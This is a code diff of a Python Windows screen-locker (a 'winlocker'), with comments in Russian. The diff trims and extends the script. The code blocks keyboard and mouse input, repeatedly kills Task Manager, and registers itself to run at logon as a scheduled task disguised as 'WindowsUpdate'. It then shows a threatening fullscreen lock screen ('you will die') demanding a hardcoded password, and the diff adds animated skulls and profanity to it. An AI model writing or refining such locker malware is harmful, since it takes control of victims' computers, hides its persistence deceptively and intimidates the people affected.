@@ -1,9 +1,15 @@
-import ctypes, os, sys, time, threading, random, webbrowser, tkinter as tk
+import ctypes
+import os
+import sys
+import time
+import threading
+import random
+import math
+import tkinter as tk
 
 # === НАСТРОЙКИ ===
 PASSWORD = "1601"
 TIMER_SECONDS = 15  # для теста, потом 600
-VIDEO_URL = "https://vk.com/video-30602036_456293338"
 
 # === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
 def block_input(block=True):
@@ -24,37 +30,12 @@ def kill_taskmgr():
         os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
         time.sleep(0.1)
 
-# === ПРОПИСЫВАЕМ В АВТОЗАГРУЗКУ (МЕТОД С ПЛАНИРОВЩИКОМ) ===
+# === ПРОПИСЫВАЕМ В АВТОЗАГРУЗКУ ===
 def add_to_startup():
     import subprocess
     script_path = os.path.abspath(__file__)
     command = f'python "{script_path}"'
     subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{command}" /sc onlogon /f', shell=True, capture_output=True)
-
-# === ОТКРЫВАЕМ ВИДЕО ВК В БРАУЗЕРЕ ===
-def play_video():
-    try:
-        webbrowser.open(VIDEO_URL)
-    except:
-        pass
-
-# === АНИМАЦИЯ ВЗЛОМА 0% → 100% ===
-def show_boot_animation():
-    root = tk.Tk()
-    root.attributes('-fullscreen', True)
-    root.configure(bg='black')
-    lbl = tk.Label(root, text="", fg='white', bg='black', font=('Courier', 36, 'bold'))
-    lbl.pack(expand=True)
-    bar = tk.Canvas(root, width=600, height=30, bg='black', highlightthickness=0)
-    bar.pack(pady=20)
-    for i in range(0, 101, 5):
-        lbl.config(text=f"ВЗЛОМ ctOS 2.0: {i}%")
-        bar.delete("progress")
-        bar.create_rectangle(10, 5, 10 + (i * 5.8), 25, fill='white', tags="progress")
-        root.update()
-        time.sleep(0.15)
-    time.sleep(0.5)
-    root.destroy()
 
 # === ГЛАВНОЕ ОКНО БЛОКИРОВКИ ===
 class WinLocker:
@@ -71,7 +52,7 @@ class WinLocker:
         self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
         self.canvas.pack(fill='both', expand=True)
         
-        # Страшные надписи
+        # Центральные надписи
         self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='white', font=('Courier', 60, 'bold'), tags="title")
         self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='white', font=('Courier', 36))
         self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
@@ -94,25 +75,59 @@ class WinLocker:
             self.canvas.itemconfig(self.status, text="НЕВЕРНЫЙ ПАРОЛЬ!")
             self.entry.delete(0, tk.END)
     
+    def draw_skull(self, x, y, laugh_frame):
+        """Рисует ASCII-череп, который смеётся"""
+        eye_h = 20 + (5 if laugh_frame % 10 < 5 else -5)
+        # Голова
+        self.canvas.create_oval(x-40, y-30, x+40, y+30, outline='white', width=2)
+        # Глаза
+        self.canvas.create_oval(x-20, y-15, x-10, y-5, fill='white')
+        self.canvas.create_oval(x+10, y-15, x+20, y-5, fill='white')
+        # Нос
+        self.canvas.create_polygon(x-10, y+5, x+10, y+5, x, y+15, fill='white')
+        # Рот (смеётся)
+        if laugh_frame % 10 < 5:
+            self.canvas.create_arc(x-30, y+10, x+30, y+50, start=200, extent=140, style='arc', outline='white', width=2)
+        else:
+            self.canvas.create_rectangle(x-30, y+15, x+30, y+35, outline='white', width=2)
+    
+    def draw_fuck(self, x, y, frame):
+        """Рисует ASCII-надпись 'FUCK'"""
+        if frame % 20 < 10:
+            self.canvas.create_text(x, y, text="FUCK", fill='white', font=('Courier', 24, 'bold'))
+        else:
+            self.canvas.create_text(x, y, text="F*CK", fill='gray', font=('Courier', 24, 'bold'))
+    
     def animate(self):
+        self.canvas.delete("skull")
+        self.canvas.delete("fuck")
+        
+        # Рисуем 5 черепов в случайных местах
+        for i in range(5):
+            x = random.randint(100, 700)
+            y = random.randint(200, 500)
+            self.draw_skull(x, y, int(time.time() * 10) + i)
+        
+        # Рисуем 3 "фака"
+        for i in range(3):
+            x = random.randint(100, 700)
+            y = random.randint(100, 500)
+            self.draw_fuck(x, y, int(time.time() * 10) + i)
+        
+        # Мерцание главной надписи
         if random.random() < 0.1:
             self.canvas.itemconfig("title", fill='gray')
         else:
             self.canvas.itemconfig("title", fill='white')
+        
         self.win.after(50, self.animate)
 
 # === ЗАПУСК ===
 if __name__ == "__main__":
-    # Если скрипт уже в автозагрузке, таймер не нужен
-    if os.path.basename(sys.argv[0]) != "winlocker.py":
-        TIMER_SECONDS = 0
-    
     add_to_startup()
     threading.Thread(target=kill_taskmgr, daemon=True).start()
     time.sleep(TIMER_SECONDS)
     block_input(True)
     threading.Thread(target=block_win_key, daemon=True).start()
-    threading.Thread(target=play_video, daemon=True).start()
-    show_boot_animation()
     app = WinLocker()
     app.root.mainloop()
